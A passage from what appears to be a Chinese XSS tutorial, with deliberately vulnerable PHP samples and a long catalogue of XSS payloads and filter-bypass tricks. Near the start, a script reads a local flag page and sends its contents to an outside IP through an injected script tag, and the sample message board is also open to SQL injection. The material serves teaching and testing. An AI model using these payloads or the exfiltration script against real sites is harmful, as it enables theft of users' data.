主要实现了留言板的功能</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-comment">#header("Content-Security-Policy: default-src 'self';") ;//这里可以设置CSP</span>
<span class="hljs-meta">?&gt;</span>
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;XSS&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'a'</span>];
<span class="hljs-variable">$link</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-string">"localhost"</span>,<span class="hljs-string">"root"</span>,<span class="hljs-string">"*****"</span>,<span class="hljs-string">"test"</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">"error"</span>.<span class="hljs-title function_ invoke__">mysql_error</span>());
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$link</span>)
{
    <span class="hljs-keyword">echo</span> <span class="hljs-number">1</span>;
    <span class="hljs-variable">$result</span> = <span class="hljs-variable">$link</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">"INSERT INTO yz VALUES ('<span class="hljs-subst">$a</span>','1','2','3')"</span>);
    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>)
        <span class="hljs-keyword">echo</span> <span class="hljs-number">2</span>;
    <span class="hljs-variable">$re</span> = <span class="hljs-variable">$link</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">"SELECT * FROM yz"</span>);
    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-variable">$re</span>-&gt;num_rows;<span class="hljs-variable">$i</span>++)
    {
        <span class="hljs-variable">$row</span> = <span class="hljs-variable">$re</span>-&gt;<span class="hljs-title function_ invoke__">fetch_row</span>();
        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>];
    }
}
<span class="hljs-meta">?&gt;</span>
&lt;script &gt;
document.<span class="hljs-title function_ invoke__">getElementsByClassName</span>(<span class="hljs-string">"input"</span>);
document.
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>
<p><strong>192.168.43.182</strong></p>
<p>3.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
  <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Access-Control-Allow-Origin: *"</span>);
<span class="hljs-meta">?&gt;</span>
&lt;script&gt;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getinfo</span>(<span class="hljs-params">str</span>) </span>{
    <span class="hljs-keyword">var</span> node=document.<span class="hljs-title function_ invoke__">createElement</span>(<span class="hljs-string">"script"</span>);
    node.type=<span class="hljs-string">"text/javascript"</span>;
    node.src=<span class="hljs-string">"http://192.168.43.182/2.php?a=1234"</span>+<span class="hljs-title function_ invoke__">escape</span>(str);
    document.<span class="hljs-title function_ invoke__">getElementsByTagName</span>(<span class="hljs-string">"HEAD"</span>)[<span class="hljs-number">0</span>].<span class="hljs-title function_ invoke__">appendChild</span>(node);
}

<span class="hljs-keyword">var</span> xmlhttp=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();
xmlhttp.<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">"GET"</span>,<span class="hljs-string">"http://127.0.0.1/flag.php"</span>,<span class="hljs-literal">true</span>);
xmlhttp.onreadystatechange=<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function"></span>{
    <span class="hljs-comment">//if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span>
    {
        <span class="hljs-title function_ invoke__">getinfo</span>(xmlhttp.responseText);

    }
}
xmlhttp.<span class="hljs-title function_ invoke__">send</span>();
&lt;/script&gt;</code></pre>
<p>在本地打开浏览器输入<br>
<a target="_blank" rel="noopener" href="http://192.168.43.165/1.php?a=">http://192.168.43.165/1.php?a=</a>&lt;link%20rel=import%20href=<a target="_blank" rel="noopener" href="http://192.168.43.182/3.php">http://192.168.43.182/3.php</a>&gt;</p>
<p>import 会导入远程资源并执行<br>
当flag端打开1.php查看留言板时会使得3.php脚本执行，从而将flag的内容发送至本地。</p>
<p>以上我目前看不懂，留着吧…</p>
<h3 id="51-常见标签及属性">5.1 常见标签及属性</h3>
<p>下面我列举的标签大部分是可以自动触发js代码的，无需用户去交互，大部分情况下我们也是希望是自动触发而不是等用户去触发。</p>
<h4 id="scirpt-标签">scirpt 标签</h4>
<script> 标签用于定义客户端脚本，比如 JavaScript。

<pre><code class="hljs js">&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>);&lt;/script&gt;

<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;xss&quot;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span></code></pre>

例如：

<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);
<span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;name&quot;</span>];
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;欢迎用户&quot;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&quot;&lt;/h2&gt;&quot;</span>;
<span class="hljs-meta">?&gt;</span></code></pre>

**利用payload：**

<pre><code class="hljs js">&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)&lt;/script&gt;</code></pre>

#### img 标签

<img> 标签定义 HTML 页面中的图像。

<pre><code class="hljs php">&lt;img src=<span class="hljs-number">1</span> onerror=<span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-number">1</span>);&gt;

&lt;img src=<span class="hljs-number">1</span> onerror=<span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-string">&quot;xss&quot;</span>);&gt;</code></pre>

#### input 标签

<input> 标签规定了用户可以在其中输入数据的输入字段。

onfocus 事件在对象获得焦点时发生：

<pre><code class="hljs js">&lt;input onfocus=<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>);&gt;</code></pre>

竞争焦点，从而触发onblur事件：

<pre><code class="hljs js">&lt;input onblur=<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>) autofocus&gt;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">autofocus</span>&gt;</span></span></code></pre>

input 标签的 autofocus 属性规定当页面加载时 <input> 元素应该自动获得焦点。可以通过autofocus属性自动执行本身的focus事件，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发：

<pre><code class="hljs js">&lt;input onfocus=<span class="hljs-string">&quot;alert(1);&quot;</span> autofocus&gt;</code></pre>

<pre><code class="hljs js"><span class="hljs-string">&quot; οnclick=alert(1)&gt;这样需要点击一下输入框&lt;br&gt;</span>
<span class="hljs-string">&quot;</span> onmouseover=<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)&gt;需要鼠标划过输入框&lt;br&gt;</code></pre>

例如：

<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);
<span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span>
<span class="hljs-string">&lt;form action=level2.php method=GET&gt;</span>
<span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;&quot;&gt;</span>
<span class="hljs-string">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span>
<span class="hljs-string">&lt;/form&gt;</span>
<span class="hljs-string">&lt;/center&gt;&#x27;</span>;
<span class="hljs-meta">?&gt;</span></code></pre>

分析代码，仍然是使用get方法，从url中接受一个keyword参数，不过这里用到一个过滤函数htmlspecialchars()，这个函数把预定义的字符转换为 HTML 实体，等于<不能用，一种方法是黑名单绕过，就是不使用被过滤的符号，使用js的事件：
**利用payload：** 

<pre><code class="hljs js"><span class="hljs-string">&quot; onmouseover=alert(1)&gt;需要鼠标划过输入框&lt;br&gt;</span></code></pre>

#### details 标签

details标签通过提供用户开启关闭的交互式控件，规定了用户可见的或者隐藏的需求的补充细节。ontoggle 事件规定了在用户打开或关闭 details元素时触发：

<pre><code class="hljs js">&lt;details ontoggle=<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>);&gt;</code></pre>

使用details 标签的 open 属性触发ontoggle事件，无需用户去点击即可触发：

<pre><code class="hljs js">&lt;details open ontoggle=<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>);&gt;</code></pre>

#### svg 标签

该标签用来在HTML页面中直接嵌入SVG 文件的代码。

<pre><code class="hljs js">&lt;svg onload=<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>);&gt;</code></pre>

#### select 标签

该标签用来创建下拉列表。

<pre><code class="hljs plaintext">&lt;select onfocus=alert(1)&gt;&lt;/select&gt;</code></pre>

通过autofocus属性规定当页面加载时元素应该自动获得焦点，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发：

<pre><code class="hljs plaintext">&lt;select onfocus=alert(1) autofocus&gt;</code></pre>

#### iframe 标签

该标签会创建包含另外一个文档的内联框架。

<pre><code class="hljs plaintext">&lt;iframe onload=alert(1);&gt;&lt;/iframe&gt;</code></pre>

#### video 标签

标签定义视频，比如电影片段或其他视频流。

<pre><code class="hljs plaintext">&lt;video&gt;&lt;source onerror=alert(1)&gt;</code></pre>

#### audio 标签

标签定义声音，比如音乐或其他音频流。

<pre><code class="hljs plaintext">&lt;audio src=x  onerror=alert(1);&gt;</code></pre>

#### body 标签

标签定义文档的主体。

<pre><code class="hljs plaintext">&lt;body onload=alert(1);&gt;</code></pre>

onscroll 事件在元素滚动条在滚动时触发。我们可以利用换行符以及autofocus，当用户滑动滚动条的时候自动触发，无需用户去点击触发：

<pre><code class="hljs plaintext">&lt;body
onscroll=alert(1);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;</code></pre>

#### textarea 标签

标签定义一个多行的文本输入控件。

<pre><code class="hljs plaintext">&lt;textarea onfocus=alert(1); autofocus&gt;</code></pre>

#### keygen 标签

<pre><code class="hljs plaintext">&lt;keygen autofocus onfocus=alert(1)&gt; //仅限火狐</code></pre>

#### marquee 标签

<pre><code class="hljs plaintext">&lt;marquee onstart=alert(1)&gt;&lt;/marquee&gt; //Chrome不行，火狐和IE都可以</code></pre>

#### isindex 标签

<pre><code class="hljs plaintext">&lt;isindex type=image src=1 onerror=alert(1)&gt;//仅限于IE</code></pre>

### 5.2 XSS 常见绕过姿势

#### 5.2.1 利用 JavaScript 伪协议

javascript: 这个特殊的协议类型声明了URL的主体是任意的javascript代码，它由javascript的解释器运行。当浏览器装载了这样的URL时，并不会转向某个URL，而是执行这个URL中包含的javascript代码，并把最后一条javascript语句的字符串值作为新文档的内容显示出来。

#### 5.2.2 无过滤情况：

##### a 标签

<pre><code class="hljs js">&lt;a href=<span class="hljs-string">&quot;javascript:alert(1);&quot;</span>&gt;xss&lt;/a&gt;
<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://www.qq.com&quot;</span>&gt;</span>qq<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span>
<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;)&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span>
<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:a&quot;</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">&quot;alert(/xss/)&quot;</span>&gt;</span>aa<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span>
<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;)&gt;</span>a<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span>
<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">eval(alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;))&gt;</span>aa<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span>
<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">kycg.asp?ttt</span>=<span class="hljs-string">1000</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">prompt(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;) <span class="hljs-attr">y</span>=<span class="hljs-string">2016</span>&gt;</span>aa<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span></code></pre>

##### p标签

<pre><code class="hljs plaintext">元素上按下鼠标时触发
&lt;p onmousedown=&quot;alert(1)&quot;&gt;text&lt;/p&gt;

元素上释放鼠标时触发
&lt;p onmouseup=&quot;alert(1)&quot;&gt;text&lt;/p&gt;</code></pre>

##### details标签

<pre><code class="hljs plaintext">&lt;details ontoggle=&quot;alert(xss);&quot;&gt;
使用open属性触发ontoggle事件，无需用户去触发
&lt;details open ontoggle=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</code></pre>

##### iframe 标签

<pre><code class="hljs plaintext">&lt;iframe src=javascript:alert(1);&gt;&lt;/iframe&gt;

&lt;iframe onload=alert(&quot;xss&quot;);&gt;&lt;/iframe&gt;

&lt;iframe src=javascript:alert(&#x27;xss&#x27;)&gt;&lt;/iframe&gt;

&lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert(&#x27;xss&#x27;)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;

&lt;iframe src=&quot;data:text/html;base64,&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;&gt;

&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;

&lt;iframe src=&quot;aaa&quot; onmouseover=alert(&#x27;xss&#x27;) /&gt;&lt;iframe&gt;

&lt;iframe src=&quot;javascript&amp;colon;prompt&amp;lpar;``xss``&amp;rpar;&quot;&gt;&lt;/iframe&gt;(````只有两个``)</code></pre>

##### button标签

<pre><code class="hljs plaintext">元素上点击鼠标时触发
&lt;button onclick=&quot;alert(1)&quot;&gt;text&lt;/button&gt;</code></pre>

##### img 标签

<pre><code class="hljs plaintext">&lt;img src=x onerror=alert(1)&gt;
&lt;img src=javascript:alert(1)&gt;    //IE7以下

图片加载错误时触发
&lt;img src=&quot;x&quot; onerror=alert(1)&gt;
&lt;img src=&quot;1&quot; onerror=eval(&quot;alert(&#x27;xss&#x27;)&quot;)&gt;
鼠标指针移动到元素时触发
&lt;img src=1 onmouseover=&quot;alert(1)&quot;&gt;
鼠标指针移出时触发
&lt;img src=1 onmouseout=&quot;alert(1)&quot;&gt;</code></pre>

##### isindex标签

<pre><code class="hljs plaintext">&lt;isindex type=image src=1 onerror=alert(&quot;xss&quot;)&gt;//仅限于IE</code></pre>

##### marquee标签

<pre><code class="hljs plaintext">&lt;marquee onstart=alert(&quot;xss&quot;)&gt;&lt;/marquee&gt; //Chrome不行，火狐和IE都可以</code></pre>

##### select标签

<pre><code class="hljs plaintext">&lt;select onfocus=alert(1)&gt;&lt;/select&gt;
通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
&lt;select onfocus=alert(1) autofocus&gt;</code></pre>

##### keygen标签

<pre><code class="hljs plaintext">&lt;keygen autofocus onfocus=alert(1)&gt; //仅限火狐</code></pre>

##### textarea标签

<pre><code class="hljs plaintext">&lt;textarea onfocus=alert(&quot;xss&quot;); autofocus&gt;</code></pre>

##### audio标签

<pre><code class="hljs plaintext">&lt;audio src=x onerror=alert(&quot;xss&quot;);&gt;</code></pre>

##### video标签

<pre><code class="hljs plaintext">&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;</code></pre>

##### input标签

<pre><code class="hljs plaintext">&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot;&gt;

竞争焦点，从而触发onblur事件
&lt;input onblur=alert(&quot;xss&quot;) autofocus&gt;&lt;input autofocus&gt;

通过autofocus属性执行本身的onfocus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus&gt;

&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;
&lt;input value=&quot;&quot; onclick=alert(&#x27;xss&#x27;) type=&quot;text&quot;&gt;
&lt;input name=&quot;name&quot; value=&quot;&quot; onmouseover=prompt(&#x27;xss&#x27;) bad=&quot;&quot;&gt;
&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;

按下按键时触发
&lt;input type=&quot;text&quot; onkeydown=&quot;alert(1)&quot;&gt;

按下按键时触发
&lt;input type=&quot;text&quot; onkeypress=&quot;alert(1)&quot;&gt;

松开按键式时触发
&lt;input type=&quot;text&quot; onkeyup=&quot;alert(1)&quot;&gt;</code></pre>

#### 5.3.3 利用link远程包含js文件

<pre><code class="hljs plaintext">在无CSP的情况下才可以
&lt;link rel=import href=&quot;http://127.0.0.1/1.js&quot;&gt;</code></pre>

#### 5.3.4 javascript伪协议

<pre><code class="hljs js">&lt;a&gt;标签
&lt;a href=<span class="hljs-string">&quot;javascript:alert(&#x27;xss&#x27;);&quot;</span>&gt;xss&lt;/a&gt;

&lt;iframe&gt;标签
&lt;iframe src=javascript:alert(&#x27;xss&#x27;);&gt;&lt;/iframe&gt;

&lt;img&gt;标签
&lt;img src=javascript:alert(&#x27;xss&#x27;)&gt;//IE7以下

&lt;form&gt;标签
&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt;</code></pre>

#### 5.3.5 expression属性

<pre><code class="hljs plaintext">&lt;img style=&quot;xss:expression(alert(&#x27;xss&#x27;&#x27;))&quot;&gt; // IE7以下
&lt;div style=&quot;color:rgb(&#x27;&#x27;�x:expression(alert(1))&quot;&gt;&lt;/div&gt; //IE7以下
&lt;style&gt;#test&#123;x:expression(alert(/XSS/))&#125;&lt;/style&gt; // IE7以下</code></pre>

#### 5.3.6 background属性

<pre><code class="hljs plaintext">&lt;table background=javascript:alert(1)&gt;&lt;/table&gt; //在Opera 10.5和IE6上有效</code></pre>

#### 5.3.7 form 标签

<pre><code class="hljs plaintext">&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt;

&lt;form action=javascript:alert(&#x27;xss&#x27;) method=&quot;get&quot;&gt;

&lt;form action=javascript:alert(&#x27;xss&#x27;)&gt;

&lt;form method=post action=aa.asp? onmouseover=prompt(&#x27;xss&#x27;)&gt;

&lt;form method=post action=aa.asp? onmouseover=alert(&#x27;xss&#x27;)&gt;

&lt;form action=1 onmouseover=alert(&#x27;xss)&gt;

&lt;form method=post action=&quot;data:text/html;base64,&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;&gt;

&lt;form method=post action=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</code></pre>

#### 5.3.8 存在过滤情况

例子：

<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);
<span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);
<span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);
<span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span>
<span class="hljs-string">&lt;form action=level5.php method=GET&gt;</span>
<span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str3</span>.<span class="hljs-string">&#x27;&quot;&gt;</span>
<span class="hljs-string">&lt;input type=submit name=submit value=搜索 /&gt;</span>
<span class="hljs-string">&lt;/form&gt;</span>
<span class="hljs-string">&lt;/center&gt;&#x27;</span>;
<span class="hljs-meta">?&gt;</span></code></pre>

分析代码发现，

**\$str2=str_replace("<script","<scr_ipt",$str); $str3=str_replace("on","o_n",$str2); 就直接把<script 转换成 <scr_ipt ，on转换成 o_n ，这样就过滤了js事件，$str = strtolower($_GET["keyword"]);这样大小写绕过也失效，不过这次没有过滤尖括号<>，这里使用伪协议来构造payload:**
利用payload:

<pre><code class="hljs plaintext">&quot;&gt;&lt;iframe src=javascript:alert(1)&gt;</code></pre>

![image-20230329104720853](浅析XSS漏洞/image-20230329104720853.png)

##### 绕过空格过滤

当空格被过滤了时，我们可以用 `/` 来代替空格：

<pre><code class="hljs js"><span class="hljs-comment">/**/</span>，注释符号绕过；
/符号绕过；

&lt;img/src=<span class="hljs-string">&quot;x&quot;</span>/onerror=<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>);&gt;
 
也可以：
 
&lt;img/src=<span class="hljs-string">&quot;x&quot;</span>onerror=<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>);&gt;</code></pre>

一般绕过空格过滤的方法有以下几种方法来取代空格

<pre><code class="hljs plaintext">/**/
()
回车(url编码中的%0a)
`(tap键上面的按钮)
tap
两个空格</code></pre>

##### 绕过引号过滤

如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号：

<pre><code class="hljs plaintext">&lt;img src=x onerror=alert(`xss`);&gt;</code></pre>

##### 绕过括号过滤

当括号被过滤的时候可以使用throw来绕过。throw 语句用于当错误发生时抛出一个错误。

<pre><code class="hljs plaintext">&lt;img src=x onerror=&quot;javascript:window.onerror=alert;throw 1&quot;&gt;
&lt;a onmouseover=&quot;javascript:window.onerror=alert;throw 1&gt;</code></pre>

##### 绕过关键字过滤

###### 1.1 大小写绕过

<pre><code class="hljs plaintext">&lt;sCRiPt&gt;alert(1);&lt;/sCrIpT&gt;
&lt;ImG sRc=x onerRor=alert(1);&gt;</code></pre>

<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);
<span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];
<span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);
<span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);
<span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,<span class="hljs-variable">$str3</span>);
<span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,<span class="hljs-variable">$str4</span>);
<span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,<span class="hljs-variable">$str5</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span>
<span class="hljs-string">&lt;form action=level6.php method=GET&gt;</span>
<span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str6</span>.<span class="hljs-string">&#x27;&quot;&gt;</span>
<span class="hljs-string">&lt;input type=submit name=submit value=搜索 /&gt;</span>
<span class="hljs-string">&lt;/form&gt;</span>
<span class="hljs-string">&lt;/center&gt;&#x27;</span>;
<span class="hljs-meta">?&gt;</span></code></pre>

分析代码，发现同样过滤了很多字符，<script 转换成 <scr_ipt ，on 转换成 o_n ，src 转换成 sr_c ，data 转换成 da_ta，href 转换成 hr_ef，发现这里没有大小写约束。

**利用payload：** 

<pre><code class="hljs plaintext">&quot;&gt;&lt;sCRiPt&gt;alert(1);&lt;/sCrIpT&gt;</code></pre>

![image-20230329105416454](浅析XSS漏洞/image-20230329105416454.png)

###### 1.2 双写绕过

有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过

<pre><code class="hljs plaintext">&lt;scrscriptipt&gt;alert(1);&lt;/scrscriptipt&gt;
&lt;imimgg srsrcc=x onerror=alert(1);&gt;</code></pre>

例子：

<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
　　<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);
　　<span class="hljs-variable">$str</span> =<span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);
　　<span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str</span>);
　　<span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str2</span>);
　　<span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str3</span>);
　　<span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str4</span>);
　　<span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str5</span>);
　　<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span>
<span class="hljs-string">　　&lt;form action=level7.php method=GET&gt;</span>
